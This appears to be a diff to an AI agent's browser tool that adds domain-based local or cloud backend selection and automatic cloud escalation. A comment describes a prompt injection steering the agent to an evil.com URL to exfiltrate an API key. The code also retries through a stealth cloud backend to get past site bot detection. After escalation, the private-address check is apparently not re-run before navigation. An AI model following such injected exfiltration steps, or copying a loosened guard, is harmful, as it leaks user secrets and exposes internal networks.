@@ -62,10 +62,18 @@ import tempfile
 import threading
 import time
 import requests
+from urllib.parse import urlparse
 from typing import Dict, Any, Optional, List
 from pathlib import Path
 from agent.auxiliary_client import call_llm
 from hermes_constants import get_hermes_home
+from internal.domain_skills import (
+    cloud_escalation_enabled as _cloud_escalation_enabled,
+    normalize_domain as _normalize_domain,
+    normalize_url as _normalize_target_url,
+    resolve_browser_domain_strategy,
+    resolve_cloud_escalation_rules,
+)
 
 try:
     from tools.website_policy import check_website_access
@@ -326,6 +334,50 @@ def _allow_private_urls() -> bool:
     return _cached_allow_private_urls
 
 
+def _resolve_target_domain(url: str) -> str:
+    normalized_url = _normalize_target_url(url)
+    if not normalized_url:
+        return ""
+    try:
+        return _normalize_domain(urlparse(normalized_url).hostname)
+    except Exception:
+        return ""
+
+
+def _resolve_browser_backend_plan(
+    *,
+    target_url: str = "",
+    force_cloud: bool = False,
+    escalation_reason: str = "",
+) -> dict[str, Any]:
+    normalized_url = _normalize_target_url(target_url)
+    target_domain = _resolve_target_domain(normalized_url)
+    strategy_info = resolve_browser_domain_strategy(target_domain=target_domain, target_url=normalized_url)
+    provider = _get_cloud_provider()
+    selected_backend = "local"
+    selected_reason = "local_preferred_default"
+    if force_cloud and provider is not None:
+        selected_backend = "cloud"
+        selected_reason = escalation_reason or "cloud_escalation"
+    elif strategy_info.get("strategy") == "cloud_required" and provider is not None:
+        selected_backend = "cloud"
+        selected_reason = "domain_strategy_cloud_required"
+    elif strategy_info.get("strategy") == "local_only":
+        selected_backend = "local"
+        selected_reason = "domain_strategy_local_only"
+    elif strategy_info.get("strategy") == "cloud_required" and provider is None:
+        selected_reason = "cloud_required_but_unavailable"
+    return {
+        "selected_backend": selected_backend,
+        "selected_reason": selected_reason,
+        "target_url": normalized_url,
+        "target_domain": target_domain,
+        "site_skill_name": str(strategy_info.get("site_skill_name") or "").strip(),
+        "browser_strategy": str(strategy_info.get("strategy") or "local_preferred"),
+        "cloud_provider_name": provider.provider_name() if provider is not None else "",
+    }
+
+
 def _socket_safe_tmpdir() -> str:
     """Return a short temp directory path suitable for Unix domain sockets.
 
@@ -368,7 +420,15 @@ _cleanup_thread = None
 _cleanup_running = False
 # Protects _session_last_activity AND _active_sessions for thread safety
 # (subagents run concurrently via ThreadPoolExecutor)
-_cleanup_lock = threading.Lock()
+_cleanup_lock = None
+
+
+def _get_cleanup_lock_lock() -> threading.Lock:
+    """Lazy-initialized lock to avoid Modal serialization issues."""
+    global _cleanup_lock
+    if _cleanup_lock is None:
+        _cleanup_lock = threading.Lock()
+    return _cleanup_lock
 
 
 def _emergency_cleanup_all_sessions():
@@ -392,7 +452,7 @@ def _emergency_cleanup_all_sessions():
     except Exception as e:
         logger.error("Emergency cleanup error: %s", e)
     finally:
-        with _cleanup_lock:
+        with _get_cleanup_lock_lock():
             _active_sessions.clear()
             _session_last_activity.clear()
         _recording_sessions.clear()
@@ -422,7 +482,7 @@ def _cleanup_inactive_browser_sessions():
     current_time = time.time()
     sessions_to_cleanup = []
     
-    with _cleanup_lock:
+    with _get_cleanup_lock_lock():
         for task_id, last_time in list(_session_last_activity.items()):
             if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                 sessions_to_cleanup.append(task_id)
@@ -432,7 +492,7 @@ def _cleanup_inactive_browser_sessions():
             elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
             logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
             cleanup_browser(task_id)
-            with _cleanup_lock:
+            with _get_cleanup_lock_lock():
                 if task_id in _session_last_activity:
                     del _session_last_activity[task_id]
         except Exception as e:
@@ -463,7 +523,7 @@ def _start_browser_cleanup_thread():
     """Start the background cleanup thread if not already running."""
     global _cleanup_thread, _cleanup_running
     
-    with _cleanup_lock:
+    with _get_cleanup_lock_lock():
         if _cleanup_thread is None or not _cleanup_thread.is_alive():
             _cleanup_running = True
             _cleanup_thread = threading.Thread(
@@ -485,7 +545,7 @@ def _stop_browser_cleanup_thread():
 
 def _update_session_activity(task_id: str):
     """Update the last activity timestamp for a session."""
-    with _cleanup_lock:
+    with _get_cleanup_lock_lock():
         _session_last_activity[task_id] = time.time()
 
 
@@ -687,7 +747,13 @@ def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
     }
 
 
-def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
+def _get_session_info(
+    task_id: Optional[str] = None,
+    *,
+    target_url: str = "",
+    force_cloud: bool = False,
+    escalation_reason: str = "",
+) -> Dict[str, str]:
     """
     Get or create session info for the given task.
     
@@ -711,7 +777,7 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
     # Update activity timestamp for this session
     _update_session_activity(task_id)
     
-    with _cleanup_lock:
+    with _get_cleanup_lock_lock():
         # Check if we already have a session for this task
         if task_id in _active_sessions:
             return _active_sessions[task_id]
@@ -721,7 +787,12 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
     if cdp_override:
         session_info = _create_cdp_session(task_id, cdp_override)
     else:
-        provider = _get_cloud_provider()
+        backend_plan = _resolve_browser_backend_plan(
+            target_url=target_url,
+            force_cloud=force_cloud,
+            escalation_reason=escalation_reason,
+        )
+        provider = _get_cloud_provider() if backend_plan["selected_backend"] == "cloud" else None
         if provider is None:
             session_info = _create_local_session(task_id)
         else:
@@ -731,8 +802,17 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
                 # CDP discovery URL instead of a raw websocket endpoint.
                 session_info = dict(session_info)
                 session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
+        session_info = dict(session_info)
+        session_info["browser_backend_selected"] = backend_plan["selected_backend"]
+        session_info["browser_escalation_reason"] = backend_plan["selected_reason"]
+        session_info["browser_strategy"] = backend_plan["browser_strategy"]
+        session_info["browser_target_domain"] = backend_plan["target_domain"]
+        session_info["browser_target_url"] = backend_plan["target_url"]
+        session_info["site_skill_name"] = backend_plan["site_skill_name"]
+        if backend_plan["cloud_provider_name"]:
+            session_info["browser_cloud_provider"] = backend_plan["cloud_provider_name"]
     
-    with _cleanup_lock:
+    with _get_cleanup_lock_lock():
         # Double-check: another thread may have created a session while we
         # were doing the network call. Use the existing one to avoid leaking
         # orphan cloud sessions.
@@ -1123,6 +1203,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     from agent.redact import _PREFIX_RE
+    initial_backend_plan = _resolve_browser_backend_plan(target_url=url)
+    is_local_target = initial_backend_plan["selected_backend"] == "local"
     if _PREFIX_RE.search(url):
         return json.dumps({
             "success": False,
@@ -1135,7 +1217,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # provider) because the agent already has full local network access via
     # the terminal tool.  Can also be opted out for cloud mode via
     # ``browser.allow_private_urls`` in config.
-    if not _is_local_backend() and not _allow_private_urls() and not _is_safe_url(url):
+    if not is_local_target and not _allow_private_urls() and not _is_safe_url(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL targets a private or internal address",
@@ -1159,7 +1241,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     
     # Get session info to check if this is a new session
     # (will create one with features logged if not exists)
-    session_info = _get_session_info(effective_task_id)
+    session_info = _get_session_info(effective_task_id, target_url=url)
     is_first_nav = session_info.get("_first_nav", True)
     
     # Auto-start recording if configured and this is first navigation
@@ -1168,6 +1250,34 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         _maybe_start_recording(effective_task_id)
     
     result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))
+
+    def _with_backend_metadata(payload: dict[str, Any], current_session: dict[str, Any]) -> dict[str, Any]:
+        enriched = dict(payload or {})
+        enriched["browser_backend_selected"] = current_session.get("browser_backend_selected") or "local"
+        enriched["browser_escalation_reason"] = current_session.get("browser_escalation_reason") or ""
+        enriched["browser_strategy"] = current_session.get("browser_strategy") or "local_preferred"
+        enriched["browser_target_domain"] = current_session.get("browser_target_domain") or _resolve_target_domain(url)
+        enriched["site_skill_name"] = current_session.get("site_skill_name") or ""
+        if current_session.get("browser_cloud_provider"):
+            enriched["browser_cloud_provider"] = current_session.get("browser_cloud_provider")
+        return enriched
+
+    escalation_rules = resolve_cloud_escalation_rules()
+    if (
+        not result.get("success")
+        and session_info.get("browser_backend_selected") == "local"
+        and _cloud_escalation_enabled()
+        and escalation_rules.get("local_failure")
+        and _get_cloud_provider() is not None
+    ):
+        cleanup_browser(effective_task_id)
+        session_info = _get_session_info(
+            effective_task_id,
+            target_url=url,
+            force_cloud=True,
+            escalation_reason="local_failure",
+        )
+        result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))
     
     if result.get("success"):
         data = result.get("data", {})
@@ -1178,7 +1288,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         # private/internal address, block the result so the model can't read
         # internal content via subsequent browser_snapshot calls.
         # Skipped for local backends (same rationale as the pre-nav check).
-        if not _is_local_backend() and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
+        is_local_session = (session_info.get("browser_backend_selected") or "local") == "local"
+        if not is_local_session and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
             # Navigate away to a blank page to prevent snapshot leaks
             _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
             return json.dumps({
@@ -1202,13 +1313,39 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         ]
         title_lower = title.lower()
         
-        if any(pattern in title_lower for pattern in blocked_patterns):
+        bot_detected = any(pattern in title_lower for pattern in blocked_patterns)
+        if bot_detected:
             response["bot_detection_warning"] = (
                 f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                 "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                 "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
                 "4) Some sites have very aggressive bot detection that may be unavoidable."
             )
+
+        if (
+            bot_detected
+            and session_info.get("browser_backend_selected") == "local"
+            and _cloud_escalation_enabled()
+            and escalation_rules.get("bot_detection")
+            and _get_cloud_provider() is not None
+        ):
+            cleanup_browser(effective_task_id)
+            session_info = _get_session_info(
+                effective_task_id,
+                target_url=url,
+                force_cloud=True,
+                escalation_reason="bot_detection",
+            )
+            result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))
+            if result.get("success"):
+                data = result.get("data", {})
+                final_url = data.get("url", final_url)
+                title = data.get("title", title)
+                response["url"] = final_url
+                response["title"] = title
+                response["bot_detection_warning"] = (
+                    "Local browser hit bot-detection heuristics; retried successfully with the cloud browser backend."
+                )
         
         # Include feature info on first navigation so model knows what's active
         if is_first_nav and "features" in session_info:
@@ -1236,12 +1373,12 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         except Exception as e:
             logger.debug("Auto-snapshot after navigate failed: %s", e)
 
-        return json.dumps(response, ensure_ascii=False)
+        return json.dumps(_with_backend_metadata(response, session_info), ensure_ascii=False)
     else:
-        return json.dumps({
+        return json.dumps(_with_backend_metadata({
             "success": False,
             "error": result.get("error", "Navigation failed")
-        }, ensure_ascii=False)
+        }, session_info), ensure_ascii=False)
 
 
 def browser_snapshot(
@@ -1952,7 +2089,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
     
     # Check if session exists (under lock), but don't remove yet -
     # _run_browser_command needs it to build the close command.
-    with _cleanup_lock:
+    with _get_cleanup_lock_lock():
         session_info = _active_sessions.get(task_id)
     
     if session_info:
@@ -1970,7 +2107,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
             logger.warning("agent-browser close failed for task %s: %s", task_id, e)
         
         # Now remove from tracking under lock
-        with _cleanup_lock:
+        with _get_cleanup_lock_lock():
             _active_sessions.pop(task_id, None)
             _session_last_activity.pop(task_id, None)
         
@@ -2010,7 +2147,7 @@ def cleanup_all_browsers() -> None:
     
     Useful for cleanup on shutdown.
     """
-    with _cleanup_lock:
+    with _get_cleanup_lock_lock():
         task_ids = list(_active_sessions.keys())
     for task_id in task_ids:
         cleanup_browser(task_id)
